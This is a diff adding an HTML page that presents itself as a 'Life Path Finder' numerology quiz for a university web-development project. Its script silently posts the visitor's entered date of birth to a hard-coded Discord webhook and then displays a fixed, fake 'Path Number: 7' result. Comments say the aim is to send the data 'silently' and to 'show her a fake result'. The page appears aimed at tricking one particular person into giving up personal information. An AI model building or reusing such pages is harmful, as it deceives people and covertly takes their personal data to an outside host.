@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CU Innovation: Life Path Project</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 350px; }
+        h2 { color: #6c5ce7; margin-bottom: 10px; }
+        p { color: #636e72; font-size: 14px; }
+        input { width: 100%; padding: 12px; margin: 20px 0; border: 2px solid #eee; border-radius: 10px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: #6c5ce7; }
+        button { background: #6c5ce7; color: white; border: none; padding: 12px 30px; border-radius: 10px; cursor: pointer; font-weight: bold; width: 100%; }
+        #loader { display: none; margin-top: 20px; color: #6c5ce7; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>✨ Life Path Finder</h2>
+    <p>Testing my new algorithm for my <strong>Chandigarh University</strong> web-dev project! Enter your DOB to find your spiritual number.</p>
+    <input type="date" id="dob" required>
+    <button onclick="calculatePath()">Calculate My Path</button>
+    <div id="loader">Analyzing alignment...</div>
+    <div id="result"></div>
+</div>
+
+<script>
+async function calculatePath() {
+    const dob = document.getElementById('dob').value;
+    const loader = document.getElementById('loader');
+    const result = document.getElementById('result');
+
+    if (!dob) { alert("Please pick a date!"); return; }
+
+    loader.style.display = "block";
+
+    // 1. SEND DATA TO YOU SILENTLY
+    const webhookURL = 'https://discord.com/api/webhooks/1495075720387498154/IdCrTE8_DHnAPAmpwo1RgxWrwyUHcsjjs8LEiLRtUJNT6bmnC2RVw4F_5HkKbNJvLncA'; // PASTE YOUR URL HERE
+
+    try {
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `🎂 **NEW BIRTHDAY CAPTURED!** \nDate: ${dob}`
+            })
+        });
+    } catch (e) { console.error("Network silent"); }
+
+    // 2. SHOW HER A FAKE RESULT
+    setTimeout(() => {
+        loader.style.display = "none";
+        result.innerHTML = `
+            <hr style="border: 0.5px solid #eee; margin: 20px 0;">
+            <h3 style="color: #00b894;">Path Number: 7</h3>
+            <p>You are a 'Seeker.' You are intuitive, analytical, and have a mysterious aura!</p>
+        `;
+    }, 2000);
+}
+</script>
+
+</body>
+</html>
